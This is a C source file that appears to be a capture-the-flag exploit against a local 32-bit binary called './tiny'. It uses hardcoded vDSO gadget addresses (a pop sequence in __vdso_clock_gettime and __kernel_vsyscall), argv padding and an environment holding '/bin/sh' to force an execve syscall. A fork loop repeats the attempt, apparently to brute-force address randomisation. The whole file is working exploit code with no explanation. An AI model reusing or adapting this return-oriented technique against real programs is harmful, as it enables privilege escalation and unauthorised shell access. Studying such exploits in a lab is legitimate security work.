#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>

/*  __vdso_clock_gettime + 311
   0xf7ffcde7 <+311>:   add    esp,0x3c
   0xf7ffcdea <+314>:   pop    ebx
   0xf7ffcdeb <+315>:   pop    esi
   0xf7ffcdec <+316>:   pop    edi
   0xf7ffcded <+317>:   pop    ebp
   0xf7ffcdee <+318>:   ret
*/

/*  __kernel_vsyscall
   0xf7ffc570 <+0>:     push   ecx
   0xf7ffc571 <+1>:     push   edx
   0xf7ffc572 <+2>:     push   ebp
   0xf7ffc573 <+3>:     mov    ebp,esp
   0xf7ffc575 <+5>:     sysenter
   0xf7ffc577 <+7>:     int    0x80
   0xf7ffc579 <+9>:     pop    ebp
   0xf7ffc57a <+10>:    pop    edx
   0xf7ffc57b <+11>:    pop    ecx
   0xf7ffc57c <+12>:    ret
   0xf7ffc57d <+13>:    int3
*/ 

#define __VDSO_POP_GADGET 0xf7ffcde7
#define __KERNEL_VSYSCALL 0xf7ffc570

void try_exploit() {
  char *argv[SYS_execve + 1] = {0};
  // Prepare args
  for(size_t i = 0; i < SYS_execve; i++) {
    argv[i] = "AAAA";
  }

  // Prepare gadget
  char gadget[5] = {0};
  *(int*)gadget = __VDSO_POP_GADGET;
  argv[0] = gadget;

  // Prepare environment
  char *envp[] = {"1=1", "2=2", "3=3", "/bin/sh", "5=5", 0};

  // After setting ebx=(&"/bin/sh"), the program will return to __KERNEL_VYSCALL

  // Exec
  //asm("int3;\n");
  execve("./tiny", argv, envp);
}

int main() {

  while(1) {
    pid_t pid = fork();
    if(pid == 0) {
      try_exploit();
    }
    int status;
    wait(&status);
    if (WIFEXITED(status)) {
      printf("exited, status=%d\n", WEXITSTATUS(status));
      return 0;
    } else if (WIFSIGNALED(status)) {
      printf("killed by signal %d\n", WTERMSIG(status));
    }
  }
}

